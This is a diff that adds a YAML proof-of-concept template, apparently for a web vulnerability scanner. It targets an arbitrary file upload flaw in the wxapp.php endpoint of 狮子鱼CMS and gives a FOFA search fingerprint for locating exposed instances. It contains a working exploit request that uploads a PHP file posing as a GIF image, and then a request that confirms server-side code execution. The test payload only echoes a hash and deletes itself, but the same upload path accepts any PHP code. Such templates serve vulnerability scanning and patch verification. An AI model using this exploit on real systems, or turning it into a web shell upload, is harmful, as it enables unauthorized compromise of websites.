@@ -1,0 +1,35 @@
+id: poc-yaml-szy-cms-wxapp-php-anyfile-upload
+info:
+  name: 狮子鱼CMS wxapp.php 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 狮子鱼CMS
+  FOFA: /seller.php?s=/Public/login
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+  dt: datetime("2006-01-02")
+requests:
+- method: POST
+  path: /wxapp.php?controller=Goods.doPageUpload
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs
+  data: '------WebKitFormBoundary8UaANmWAgM4BqBSs
+
+    Content-Disposition: form-data; name="upfile"; filename="test.php"
+
+    Content-Type: image/gif
+
+
+    <?php echo md5({{.t1}});unlink(__FILE__);?>
+
+    ------WebKitFormBoundary8UaANmWAgM4BqBSs--'
+  expression: status_code == 200 && contains(body,".php") && contains(body,"Uploads")
+    && contains(body,"goods")
+  output:
+  - regex_match(body,"(?P<file>[0-9]{16}).php")
+- method: GET
+  path: /Uploads/image/goods/{{.dt}}/{{.file}}.php
+  expression: status_code == 200 && body == t2
+transport: http
